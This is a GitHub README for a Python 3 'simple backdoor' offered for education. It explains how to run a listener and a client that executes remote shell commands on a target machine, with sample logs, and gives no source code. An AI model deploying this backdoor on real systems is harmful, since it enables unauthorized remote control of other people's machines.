# Simple Backdoor in Python3

[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT/)

A simple backdoor implementation in Python 3, designed for educational purposes and proof-of-concept demonstrations. This project should not be used for malicious activities.

## Table of Contents

1. [Dependencies](#dependencies)
2. [Getting Started](#getting-started)
   - [Cloning the Repository](#cloning-the-repository)
   - [Setting Up the Environment](#setting-up-the-environment)
3. [Usage](#usage)
   - [Server (Listener)](#server-listener)
   - [Client (Backdoor)](#client-backdoor)
   - [Controlling the Backdoor](#controlling-the-backdoor)
4. [Security Disclaimer](#security-disclaimer)

## Dependencies

- **Git** for cloning this repository into your machine. Download it from [here](https://git-scm.com/downloads).
- **Python 3.x** (Tested on Python 3.11) on both server and client machines.
- **Optional dependencies** for colored logs: `coloredlogs` and `colorama`. Install them using **Pip**:

  ```bash
  pip install -r requirements.txt
  ```

## Getting Started

### Cloning the Repository

Clone this repository into your machine using the following command in a terminal (ensure you have **Git** installed):

```bash
git clone https://github.com/AshkanFeyzollahi/simple-backdoor.git
```

### Setting Up the Environment

After cloning the repository, navigate to the project folder:

```bash
cd simple-backdoor
```

## Usage

### Server (Listener)

1. Run `src/server.py` on the server machine:

   ```bash
   python src/server.py
   ```

2. The server will initiate and listen for incoming connections. Once a client connects, you can start sending shell commands.

### Client (Backdoor)

1. Run `src/backdoor.py` on the target machine:

   ```bash
   python src/backdoor.py
   ```

2. The backdoor will establish a connection with the server and wait for commands.

### Controlling the Backdoor

Once the backdoor is connected, you can execute shell commands by typing them into the server's console, followed by Enter. The backdoor will receive the command, run it on the target machine, and send the output back to the server.

**Server side:**

```plain
2024-12-17 17:30:58 __main__[7708] INFO Initiating server
2024-12-17 17:30:58 __main__[7708] INFO Server initiated
2024-12-17 17:30:58 __main__[7708] INFO Awaiting client
2024-12-17 17:31:01 __main__[7708] INFO 127.0.0.1:62559 Connected to the server!
[127.0.0.1:62559] > echo Hello!
Hello!

[127.0.0.1:62559] >
```

**Client side:**

```plain
2024-12-17 17:31:01 __main__[8296] INFO Initiating connection
2024-12-17 17:31:01 __main__[8296] INFO Connection initiated
2024-12-17 17:31:01 __main__[8296] INFO Awaiting command
2024-12-17 17:31:10 __main__[8296] INFO Creating a new process in order to run server command
2024-12-17 17:31:10 __main__[8296] INFO The sent command was ran on the device
Hello!

2024-12-17 17:31:10 __main__[8296] INFO Sending output of the sent server command
2024-12-17 17:31:10 __main__[8296] INFO Output sent
2024-12-17 17:31:10 __main__[8296] INFO Awaiting command
```

## Security Disclaimer

This project is intended for educational and demonstration purposes only. **Unauthorized access to computer systems is illegal and unethical.** Ensure you have explicit permission from system owners before running this software on their machines. Always use this software responsibly and in accordance with the law. The developers of this project are not responsible for any misuse or damage caused by this software.